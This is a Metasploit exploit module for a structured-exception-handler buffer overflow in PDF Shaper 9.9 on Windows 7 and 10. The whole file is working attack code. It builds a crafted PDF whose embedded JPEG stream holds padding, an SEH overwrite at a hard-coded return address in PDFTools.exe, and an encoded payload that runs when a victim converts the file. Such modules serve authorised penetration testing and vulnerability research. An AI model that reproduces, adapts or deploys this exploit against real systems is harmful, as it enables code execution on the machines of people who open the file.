##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::PDF
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'PDF Shaper Buffer Overflow',
      'Description'     => %q{
        PDF Shaper is prone to a security vulnerability when processing PDF files.
        The vulnerability appears when we use Convert PDF to Image or PDF To PDF and use a specially
        crafted PDF file. This module has been tested successfully on Win 7, Win 10.
      },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'metacom27[at]gmail.com - twitter.com/m3tac0m', # POC
          'metacom' # MSF Module
        ],
      'References'      =>
        [
          ['EDB', '37760']
        ],
      'DefaultOptions'  =>
        {
          'EXITFUNC' => 'process', # none/process/thread/seh
        },
      'Platform'        => 'win',
      'Payload'         =>
        {
          'Space' => 2000,
          'DisableNops' => true
        },
      'Targets'         =>
        [
          ['< Win 7, Win 10 / PDF Shaper Free, Premium and Profesional v.9.9 >',
           {
             'Ret' => 0x00402B19, # PDFTools.exe
             'Offset' => 433
           }
          ]
        ],
      'Privileged'      => false,
      'DisclosureDate'  => 'Oct 03 2015',
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('FILENAME', [false, 'The file name.', 'msf.pdf'])
      ], self.class
    )
  end

  def exploit
    file_create(make_pdf)
  end

  def jpeg
    buffer = "\xFF\xD8\xFF\xEE\x00\x0E\x41\x64\x6F\x62\x65\x00\x64\x80\x00\x00"
    buffer << "\x00\x02\xFF\xDB\x00\x84\x00\x02\x02\x02\x02\x02\x02\x02\x02\x02"
    buffer << "\x02\x03\x02\x02\x02\x03\x04\x03\x03\x03\x03\x04\x05\x04\x04\x04"
    buffer << "\x04\x04\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x07\x08\x08\x08"
    buffer << "\x07\x05\x09\x0A\x0A\x0A\x0A\x09\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C"
    buffer << "\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x01\x03\x02\x02\x03\x03\x03\x07\x05"
    buffer << "\x05\x07\x0D\x0A\x09\x0A\x0D\x0F\x0D\x0D\x0D\x0D\x0F\x0F\x0C\x0C"
    buffer << "\x0C\x0C\x0C\x0F\x0F\x0C\x0C\x0C\x0C\x0C\x0C\x0F\x0C\x0E\x0E\x0E"
    buffer << "\x0E\x0E\x0C\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11"
    buffer << "\x11\x11\x11\x11\x11\x11\x11\x11\xFF\xC0\x00\x14\x08\x00\x32\x00"
    buffer << "\xE6\x04\x01\x11\x00\x02\x11\x01\x03\x11\x01\x04\x11\x00\xFF\xC4"
    buffer << "\x01\xA2\x00\x00\x00\x07\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00"
    buffer << "\x00\x00\x00\x04\x05\x03\x02\x06\x01\x00\x07\x08\x09\x0A\x0B\x01"
    buffer << "\x54\x02\x02\x03\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00"
    buffer << "\x01\x00\x02\x03\x04\x05\x06\x07"
    buffer << rand_text(target['Offset']) # junk
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded
    buffer << rand_text(2388 - payload.encoded.length)
    buffer
  end

  def make_pdf
    @pdf << header
    add_object(1, "<</Type/Catalog/Outlines 2 0 R /Pages 3 0 R>>")
    add_object(2, "<</Type/Outlines>>")
    add_object(3, "<</Type/Pages/Kids[5 0 R]/Count 1/Resources <</ProcSet 4 0 R/XObject <</I0 7 0 R>>>>/MediaBox[0 0 612.0 792.0]>>")
    add_object(4, "[/PDF/Text/ImageC]")
    add_object(5, "<</Type/Page/Parent 3 0 R/Contents 6 0 R>>")
    stream_1 = "stream" << eol
    stream_1 << "0.000 0.000 0.000 rg 0.000 0.000 0.000 RG q 265.000 0 0 229.000 41.000 522.000 cm /I0 Do Q" << eol
    stream_1 << "endstream" << eol
    add_object(6, "<</Length 91>>#{stream_1}")
    stream = "<<" << eol
    stream << "/Width 230" << eol
    stream << "/BitsPerComponent 8" << eol
    stream << "/Name /X" << eol
    stream << "/Height 50" << eol
    stream << "/Intent /RelativeColorimetric" << eol
    stream << "/Subtype /Image" << eol
    stream << "/Filter /DCTDecode" << eol
    stream << "/Length #{jpeg.length}" << eol
    stream << "/ColorSpace /DeviceCMYK" << eol
    stream << "/Type /XObject" << eol
    stream << ">>"
    stream << "stream" << eol
    stream << jpeg << eol
    stream << "endstream" << eol
    add_object(7, stream)
    finish_pdf
  end
end
